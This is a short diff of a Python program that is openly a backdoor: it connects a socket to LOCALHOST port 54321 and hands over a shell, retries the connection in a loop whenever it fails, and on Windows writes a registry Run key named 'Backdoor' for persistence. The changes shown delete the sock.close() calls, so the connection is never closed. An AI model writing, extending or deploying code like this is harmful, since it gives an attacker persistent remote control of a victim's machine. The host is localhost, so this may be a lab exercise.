@@ -63,7 +63,6 @@ def connection():
         try:
             sock.connect(("LOCALHOST", 54321))
             shell()
-            sock.close()
         except:
             connection()
 
@@ -148,6 +147,4 @@ if os.name == 'nt':
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location +'"', shell = True)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 connection()
-sock.close()
